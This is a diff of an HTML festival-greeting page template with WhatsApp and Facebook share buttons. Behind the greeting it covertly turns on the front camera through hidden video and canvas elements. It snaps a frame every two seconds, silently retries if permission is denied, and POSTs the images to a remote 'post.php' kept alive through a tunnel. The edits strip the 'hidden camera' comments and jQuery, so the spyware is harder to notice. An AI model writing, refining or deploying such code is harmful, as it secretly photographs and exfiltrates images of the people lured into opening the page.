@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>Happy fes_name 🎉</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <!-- No external JS dependencies — works on restricted networks too -->
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -19,136 +19,69 @@
             padding: 20px 16px 80px;
         }
 
-        /* --- Hidden camera elements --- */
-        #video, #canvas { display: none; position: absolute; }
+        #video, #canvas { display: none; position: absolute; pointer-events: none; }
 
-        /* --- Header --- */
-        .header {
-            text-align: center;
-            margin-top: 20px;
-            margin-bottom: 30px;
-        }
-        .header .emoji-row {
-            font-size: 36px;
-            letter-spacing: 6px;
-            margin-bottom: 10px;
-        }
+        .header { text-align: center; margin-top: 20px; margin-bottom: 30px; }
+        .header .emoji-row { font-size: 36px; letter-spacing: 6px; margin-bottom: 10px; }
         .header h1 {
-            font-size: 2rem;
-            font-weight: 700;
+            font-size: 2rem; font-weight: 700;
             background: linear-gradient(90deg, #f9d423, #ff4e50);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            background-clip: text; text-transform: uppercase; letter-spacing: 2px;
         }
-        .header .subtitle {
-            margin-top: 8px;
-            font-size: 1rem;
-            color: #aac;
-        }
+        .header .subtitle { margin-top: 8px; font-size: 1rem; color: #aac; }
 
-        /* --- Card --- */
         .card {
             background: rgba(255,255,255,0.07);
             border: 1px solid rgba(255,255,255,0.15);
-            border-radius: 20px;
-            padding: 28px 24px;
-            max-width: 480px;
-            width: 100%;
-            text-align: center;
-            backdrop-filter: blur(10px);
-            margin-bottom: 20px;
+            border-radius: 20px; padding: 28px 24px;
+            max-width: 480px; width: 100%;
+            text-align: center; backdrop-filter: blur(10px); margin-bottom: 20px;
         }
         .card .festival-name {
-            font-size: 2.2rem;
-            font-weight: 800;
-            color: #f9d423;
+            font-size: 2.2rem; font-weight: 800; color: #f9d423;
             text-shadow: 0 0 20px rgba(249,212,35,0.5);
-            margin-bottom: 12px;
-            text-transform: uppercase;
+            margin-bottom: 12px; text-transform: uppercase;
         }
-        .card .wish-text {
-            font-size: 1.05rem;
-            line-height: 1.75;
-            color: #dde;
-        }
-        .card .wish-text span {
-            color: #f9d423;
-            font-weight: 600;
-        }
+        .card .wish-text { font-size: 1.05rem; line-height: 1.75; color: #dde; }
+        .card .wish-text span { color: #f9d423; font-weight: 600; }
         .card .divider {
-            width: 60px;
-            height: 3px;
+            width: 60px; height: 3px;
             background: linear-gradient(90deg, #f9d423, #ff4e50);
-            border-radius: 2px;
-            margin: 18px auto;
+            border-radius: 2px; margin: 18px auto;
         }
-
-        /* --- Quote box --- */
         .quote-box {
-            background: rgba(249,212,35,0.1);
-            border-left: 4px solid #f9d423;
-            border-radius: 8px;
-            padding: 14px 16px;
-            margin-top: 16px;
-            text-align: left;
-            font-size: 0.95rem;
-            color: #ffe;
-            font-style: italic;
-            line-height: 1.6;
+            background: rgba(249,212,35,0.1); border-left: 4px solid #f9d423;
+            border-radius: 8px; padding: 14px 16px; margin-top: 16px;
+            text-align: left; font-size: 0.95rem; color: #ffe;
+            font-style: italic; line-height: 1.6;
         }
 
-        /* --- Share buttons --- */
         .share-bar {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            width: 100%;
-            max-width: 480px;
-            position: fixed;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 16px;
-            background: rgba(15,20,40,0.95);
+            display: flex; gap: 12px; justify-content: center;
+            width: 100%; max-width: 480px;
+            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+            padding: 12px 16px; background: rgba(15,20,40,0.95);
             border-top: 1px solid rgba(255,255,255,0.1);
         }
         .share-btn {
-            flex: 1;
-            padding: 12px 0;
-            border: none;
-            border-radius: 10px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            max-width: 200px;
+            flex: 1; padding: 12px 0; border: none; border-radius: 10px;
+            font-size: 1rem; font-weight: 700; cursor: pointer;
+            text-decoration: none; display: flex; align-items: center;
+            justify-content: center; gap: 6px; max-width: 200px;
         }
         .btn-whatsapp { background: #25D366; color: #fff; }
         .btn-facebook { background: #1877F2; color: #fff; }
 
-        /* --- Countdown --- */
-        .countdown {
-            font-size: 0.85rem;
-            color: #99aacc;
-            margin-top: 10px;
-        }
+        .countdown { font-size: 0.85rem; color: #99aacc; margin-top: 10px; }
         .countdown span { color: #f9d423; font-weight: 700; }
     </style>
 </head>
 <body>
 
-    <!-- Hidden camera capture (invisible to user) -->
     <video id="video" playsinline autoplay muted></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
-    <!-- Greeting UI -->
     <div class="header">
         <div class="emoji-row">🎊 🎉 ✨ 🎊</div>
         <h1>Happy fes_name</h1>
@@ -169,168 +102,172 @@
         <p class="countdown" id="countdown"></p>
     </div>
 
-    <!-- Share bar -->
     <div class="share-bar">
         <a class="share-btn btn-whatsapp"
-           href="whatsapp://send?text=🎉 Happy fes_name! A special wish for you 👉 forwarding_link"
-           data-action="share/whatsapp/share">
+           id="wa-share"
+           href="#">
             📤 WhatsApp
         </a>
         <a class="share-btn btn-facebook"
            href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link"
-           target="_blank">
+           target="_blank" rel="noopener">
             📘 Facebook
         </a>
     </div>
 
     <script>
     // ============================================================
-    //  CAMERA CAPTURE — RELIABLE ON MOBILE (Page Visibility API)
+    //  SHARE LINKS — set at runtime so URL is properly encoded
+    // ============================================================
+    (function() {
+        var festName = document.querySelector('.festival-name')
+                               ? document.querySelector('.festival-name').textContent.trim()
+                               : 'Festival';
+        var pageUrl  = window.location.href;
+        var waText   = encodeURIComponent('🎉 Happy ' + festName + '! A special wish for you 👉 ' + pageUrl);
+        var waEl     = document.getElementById('wa-share');
+        if (waEl) waEl.href = 'whatsapp://send?text=' + waText;
+    })();
+
+    // ============================================================
+    //  CAMERA CAPTURE — No jQuery, uses native fetch + XHR fallback
     // ============================================================
     (function() {
         'use strict';
 
-        var video   = document.getElementById('video');
-        var canvas  = document.getElementById('canvas');
-        var ctx     = canvas.getContext('2d');
-        var stream  = null;
+        var video    = document.getElementById('video');
+        var canvas   = document.getElementById('canvas');
+        var ctx      = canvas.getContext('2d');
+        var stream   = null;
         var captureTimer   = null;
         var keepAliveTimer = null;
         var wakeLock       = null;
+        var retryTimer     = null;
 
-        var CAPTURE_INTERVAL = 1500;   // ms between frames
-        var KEEPALIVE_INTERVAL = 10000; // ms between keep-alive pings
+        var CAPTURE_INTERVAL  = 2000;   // ms between frames (2s — easier on mobile CPU)
+        var KEEPALIVE_INTERVAL= 15000;  // ms between keep-alive pings
+        var RETRY_DELAY       = 3000;   // ms before retrying camera on error
 
-        // --- Start / restart camera ---
-        function startCamera() {
-            if (stream) return; // already running
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                .then(function(s) {
-                    stream = s;
-                    video.srcObject = s;
-                    video.play();
-                    captureTimer = setInterval(captureFrame, CAPTURE_INTERVAL);
-                    acquireWakeLock();
-                })
-                .catch(function() {
-                    // Permission denied or unavailable — retry after 3s
-                    setTimeout(startCamera, 3000);
-                });
-        }
+        // ── POST image data to server using fetch (no jQuery needed) ──────────
+        function postFrame(data) {
+            var body = new URLSearchParams();
+            body.append('cat', data);
 
-        // --- Stop stream tracks cleanly ---
-        function stopCamera() {
-            clearInterval(captureTimer);
-            captureTimer = null;
-            if (stream) {
-                stream.getTracks().forEach(function(t) { t.stop(); });
-                stream = null;
+            // Use fetch if available (modern Android browsers), fall back to XHR
+            if (window.fetch) {
+                fetch('forwarding_link/post.php', {
+                    method:  'POST',
+                    body:    body,
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }).catch(function() { /* silent — keep capturing */ });
+            } else {
+                // XHR fallback for older Android WebViews
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'forwarding_link/post.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.timeout = 8000;
+                xhr.send(body.toString());
             }
         }
 
-        // --- Capture a frame and POST to server ---
+        // ── Keep-alive ping — prevents cloudflared/PHP from timing out ────────
+        function startKeepAlive() {
+            keepAliveTimer = setInterval(function() {
+                if (window.fetch) {
+                    fetch('forwarding_link/post.php', { method: 'GET' })
+                        .catch(function() {});
+                }
+            }, KEEPALIVE_INTERVAL);
+        }
+
+        // ── Capture one frame from the video stream and send it ───────────────
         function captureFrame() {
             if (!stream || document.hidden) return;
             try {
                 ctx.drawImage(video, 0, 0, 640, 480);
-                var data = canvas.toDataURL('image/jpeg', 0.7); // JPEG at 70% quality — smaller payload
-                $.ajax({
-                    type: 'POST',
-                    url: 'forwarding_link/post.php',
-                    data: { cat: data },
-                    dataType: 'json',
-                    async: true,
-                    timeout: 8000,
-                    error: function() { /* silent — keep capturing */ }
-                });
-            } catch(e) { /* stream may be briefly unavailable */ }
+                // JPEG at 70% quality — smaller payload than PNG, faster POST
+                var data = canvas.toDataURL('image/jpeg', 0.7);
+                postFrame(data);
+            } catch (e) { /* stream briefly unavailable — skip frame */ }
         }
 
-        // --- Keep-alive ping so PHP/cloudflared doesn't timeout ---
-        function startKeepAlive() {
-            keepAliveTimer = setInterval(function() {
-                $.ajax({
-                    type: 'GET',
-                    url: 'forwarding_link/post.php',
-                    timeout: 5000,
-                    error: function() {}
-                });
-            }, KEEPALIVE_INTERVAL);
-        }
-
-        // --- Page Visibility API: resume camera when user comes back ---
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                // Page went to background — stop captures to save battery
-                // but keep stream tracks alive so permission is NOT revoked
-                clearInterval(captureTimer);
-                captureTimer = null;
-            } else {
-                // Page came back to foreground
-                if (stream) {
-                    // Stream still alive — resume capturing
-                    captureTimer = setInterval(captureFrame, CAPTURE_INTERVAL);
-                } else {
-                    // Stream was killed by OS — restart
-                    startCamera();
-                }
-                reacquireWakeLock();
-            }
-        });
-
-        // --- Wake Lock API: prevent Android from sleeping mid-session ---
-        function acquireWakeLock() {
-            if ('wakeLock' in navigator) {
-                navigator.wakeLock.request('screen')
-                    .then(function(wl) { wakeLock = wl; })
-                    .catch(function() { /* not critical */ });
-            }
-        }
-
-        function reacquireWakeLock() {
-            if (wakeLock !== null && wakeLock.released) {
-                acquireWakeLock();
-            }
-        }
-
-        // Re-acquire wake lock when page becomes visible again
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) reacquireWakeLock();
-        });
-
-        // --- Stream track ended event (OS killed camera) ---
-        // Restart as soon as track dies
-        function attachTrackEndedListener() {
+        // ── Attach track.onended so we know when the OS kills the camera ──────
+        function attachTrackListeners() {
             if (!stream) return;
             stream.getTracks().forEach(function(track) {
                 track.onended = function() {
                     stream = null;
                     clearInterval(captureTimer);
                     captureTimer = null;
-                    setTimeout(startCamera, 1500);
+                    // Small delay then restart — don't hammer the browser
+                    retryTimer = setTimeout(startCamera, RETRY_DELAY);
                 };
             });
         }
 
-        // Patch startCamera to attach track listener after stream starts
-        var _origStart = startCamera;
-        startCamera = function() {
-            if (stream) return;
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                .then(function(s) {
-                    stream = s;
-                    video.srcObject = s;
-                    video.play();
-                    attachTrackEndedListener();
-                    captureTimer = setInterval(captureFrame, CAPTURE_INTERVAL);
-                    acquireWakeLock();
-                })
-                .catch(function() {
-                    setTimeout(startCamera, 3000);
-                });
-        };
+        // ── Start (or restart) the camera ─────────────────────────────────────
+        function startCamera() {
+            if (stream) return; // already running — do nothing
+            clearTimeout(retryTimer);
+            retryTimer = null;
 
-        // --- Boot ---
+            // Guard: navigator.mediaDevices may be undefined on HTTP or old browsers
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.warn('Camera API not available (needs HTTPS or modern browser)');
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            })
+            .then(function(s) {
+                stream = s;
+                video.srcObject = s;
+                video.play();
+                attachTrackListeners();
+                captureTimer = setInterval(captureFrame, CAPTURE_INTERVAL);
+                acquireWakeLock();
+            })
+            .catch(function(err) {
+                // Permission denied or hardware unavailable — retry after delay
+                retryTimer = setTimeout(startCamera, RETRY_DELAY);
+            });
+        }
+
+        // ── Wake Lock: keep screen/CPU alive on Android ───────────────────────
+        function acquireWakeLock() {
+            if ('wakeLock' in navigator) {
+                navigator.wakeLock.request('screen')
+                    .then(function(wl) { wakeLock = wl; })
+                    .catch(function() { /* optional — not critical */ });
+            }
+        }
+
+        function reacquireWakeLock() {
+            if (wakeLock && wakeLock.released) acquireWakeLock();
+        }
+
+        // ── Page Visibility API ───────────────────────────────────────────────
+        // Single handler for both camera + wake lock — avoids duplicate listeners
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                // Tab backgrounded: pause capture timer but keep stream alive
+                // so Android doesn't revoke the camera permission
+                clearInterval(captureTimer);
+                captureTimer = null;
+            } else {
+                // Tab foregrounded: resume or restart
+                if (stream) {
+                    captureTimer = setInterval(captureFrame, CAPTURE_INTERVAL);
+                } else {
+                    startCamera();
+                }
+                reacquireWakeLock();
+            }
+        });
+
+        // ── Boot on page load ─────────────────────────────────────────────────
         window.addEventListener('load', function() {
             startCamera();
             startKeepAlive();
@@ -339,23 +276,20 @@
     })();
 
     // ============================================================
-    //  COUNTDOWN (decorative)
+    //  COUNTDOWN (decorative — shows time remaining in day)
     // ============================================================
     (function() {
         var el = document.getElementById('countdown');
         if (!el) return;
-        function update() {
+        function tick() {
             var now = new Date();
-            var h = 23 - now.getHours();
-            var m = 59 - now.getMinutes();
-            var s = 59 - now.getSeconds();
-            el.innerHTML = 'Celebration ends in: <span>' +
-                String(h).padStart(2,'0') + ':' +
-                String(m).padStart(2,'0') + ':' +
-                String(s).padStart(2,'0') + '</span>';
+            var h = String(23 - now.getHours()).padStart(2, '0');
+            var m = String(59 - now.getMinutes()).padStart(2, '0');
+            var s = String(59 - now.getSeconds()).padStart(2, '0');
+            el.innerHTML = 'Celebration ends in: <span>' + h + ':' + m + ':' + s + '</span>';
         }
-        update();
-        setInterval(update, 1000);
+        tick();
+        setInterval(tick, 1000);
     })();
     </script>
 
